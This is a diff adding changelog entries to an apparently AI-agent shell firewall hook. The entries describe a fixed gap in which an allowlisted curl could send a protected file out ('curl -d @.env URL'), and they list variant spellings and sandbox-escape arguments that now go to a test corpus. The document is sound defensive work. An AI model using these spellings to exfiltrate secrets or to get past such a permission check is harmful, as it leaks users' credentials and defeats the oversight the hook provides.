@@ -2,6 +2,25 @@
 
 ## Unreleased
 
+- **`@file` arguments are checked for every binary without a grammar** (#11).
+  `shell_ask` and `shell_exact` already looked inside `@file`, `--opt=@file` and
+  `-d@file`; a binary on `shell_allowlist` did not, so with `curl` allowlisted
+  `curl -d @.env URL` was `sh-ok` and sent the file. The conservative fallback
+  now treats as paths every operand, `--opt=value` value and attached short
+  value (`-o/tmp/x`), each also without a leading `@`, and refuses any value
+  after `=` or name after `@` (`-F f=@.env`, `--data-urlencode name@.env`)
+  that is a protected path. It applies to all three grants.
+- Behaviour change, stricter for existing policies: with a grammar-less binary
+  allowlisted, `curl -d @.env`, `--data=@.env`, `-d@.env`, `-F f=@.env` and
+  `name@.env` go from allow to `sh-paths`, and so do `-d @/etc/hosts`,
+  `-d@../x` and `-o/tmp/x`, which leave the sandbox (as `-T /etc/hosts` and
+  `-o /tmp/x` already did). Binaries with a grammar decide as before.
+- `--learn-mode ask` refuses these instead of asking about them: it asks only
+  when the rest of the policy would let the call through, and now it would not.
+- Naming a protected path through any of these spellings taints the session,
+  even when the binary is off the allowlist (`curl -d @.env` did not).
+- Corpus: the four spellings from the issue, `name@.env` and two sandbox escapes.
+
 - **Learning mode counts an ask only after your yes** (#4). Registered for
   `PostToolUse` as well, `vt-agent-firewall-hook --learn` appends a `ran` record
   (session, `tool_use_id`, tool name; never the tool's output) for each call the
